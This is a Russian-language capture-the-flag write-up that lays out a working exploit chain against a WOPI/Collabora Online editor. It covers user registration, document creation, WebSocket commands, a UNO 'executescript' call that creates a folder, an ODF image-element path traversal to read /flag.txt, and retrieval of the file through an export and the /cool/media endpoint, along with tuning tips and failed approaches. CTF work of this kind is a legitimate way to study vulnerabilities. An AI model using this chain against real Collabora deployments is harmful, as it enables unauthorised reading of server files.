# 2026-11-01 Офисные редакторы (WOPI/Collabora) — РЕШЕНО: media traversal

## 💨 ЭКСПРЕСС-ПУТЬ (для следующего раза: экономия ~90% времени)
1. Регистрация случайного пользователя (`email` с доменом сервиса, `name`, `password`) + логин (form-urlencoded) → сессия.
2. `POST /docs/create {title}` → 302 → `/edit/dN` → `PUT /wopi/files/dN/contents?access_token=...` (blob, ОБЯЗАТЕЛЬНО).
3. Из `/edit/dN` iframe → WOPISrc + access_token → WebSocket `/cool/ws?WOPISrc=..&access_token=..&access_token_ttl=0&no_auth_header=&permission=edit&compat=`.
4. `coolclient 0.1 <ts> 0` → `load url=<quote(wopi_src)> lang=en-US timezone=UTC clientvisiblearea=0;0;15000;15000` → ждать `status:`/`loaded:`.
5. `executescript 1` (UNO): `SFA.createFolder('file:///tmp/<TAG>.txt')`, `doc.getText().setString('<image src="file:///tmp/<TAG>.txt/' + '../'.repeat(10) + 'flag.txt"/>')`.
6. `downloadas name=<TAG>.txt id=export format=txt options=` → ждать `downloadas:` (ретраи 3–4 × 120с) → `downloadid=...`.
7. `GET /cool/<enc_wopi_src>/download/<id>?WOPISrc=<enc>&compat=/ws` → найти `src="...cool/media?..."`.
8. `GET /cool/media?WOPISrc=..&ServerId=..&ViewId=..&Tag=<TAG>` → тело = ФЛАГ.

Не трать время на SSRF/convert-to/макросы/фетч чужих документов.

## Итог
Флаг получен с главной страницы инстанса (формат `ctfcup{...}`); инстанс — эфемерный URL, изменяется между запусками (брать из задания/трафика).

## Рабочая цепочка (PoC: `toolbox/docus/docus_poc_run.py`)
1. Регистрация нового пользователя `ctf<hex>@corp` + логин (form-urlencoded).
2. Создание собственного документа `poc.txt` → id `d<N>`.
3. **Обязательный** `PUT /wopi/files/d<N>/contents` с blob (без него `savetostorage` даёт `kind=savefailed`).
4. WebSocket `GET /cool/ws?WOPISrc=..&access_token=..&access_token_ttl=0&no_auth_header=&permission=edit&compat=`; команды:
   `coolclient 0.1 <ts> 0` → `load url=<quote(wopi_src)> lang=en-US timezone=UTC clientvisiblearea=0;0;15000;15000` → ждать `status:`/`loaded:` (пауза ~5с).
5. `executescript 1 <JS>`: `uno.componentContext.getServiceManager().createInstanceWithContext('com.sun.star.ucb.SimpleFileAccess', ctx)`; `sfa.createFolder('file:///tmp/<TAG>.txt')` (игнор. ошибку); `doc.getText().setString('<image src="file:///tmp/<TAG>.txt/' + '../'.repeat(10) + 'flag.txt"/>')`.
6. `downloadas name=<TAG>.txt id=export format=txt options=` → ждать `downloadas:` (в моей версии: 4 попытки по 120 с, первую из них дала ответ id=...).
7. `GET /cool/<enc_wopi_src>/download/<download_id>?WOPISrc=<enc>&compat=/ws` → в теле `<image src=".../cool/media?WOPISrc=..&ServerId=..&ViewId=..&Tag=<TAG>"/>`.
8. `GET /cool/media?WOPISrc=..&ServerId=..&ViewId=..&Tag=<TAG>` (без `compat`) → тело = флаг (47 байт).

## Ключевые уроки
- Уязвимость — path traversal в **элементе изображения** ODF (XML `image src="file://..."`), а не в чтении файла: `../` уходит из `/tmp/<TAG>.txt/` (созданного как папка!) на 10 уровней до корня, `flag.txt` лежит в корне контейнера Collabora.
- Путь `file:///tmp/<TAG>.txt` должен быть **папкой** (SFA.createFolder) — тогда `../` работает.
- Экспорт в TXT (`downloadas format=txt`) выдаёт HTML-обёртку с media-ссылкой на скачанное изображение → флаг отдаётся как «медиа».
- `savetostorage` перед downloadas НЕ обязателен (а если PUT-блоб не сделан — падает с savefailed). В рабочем прогоне он даже не был задействован — хватило PUT + downloadas.
- Предварительный PUT blob обязателен, чтобы документ «существовал» для экспорта.
- Свежий пользователь на каждый запуск (без уникальности сессии могут быть расхождения).
- `DisableExport:true` в CheckFileInfo не мешает `downloadas` (экспорт идёт через cool ws, а не через WOPI export).
- Таймауты: downloadas может отвечать медленно; сделать 3–4 попытки.

## Не сработало / не нужно было
- Фетч всех документов (d1..d200) — флага в содержимом не было.
- SSRF через FileUrl/CheckFileInfo на webapp/flag; convert-to; макросы; file:// чтение напрямую — не обязательны.
- Автосохранение/кнопки в браузере (playwright) — не понадобилось.
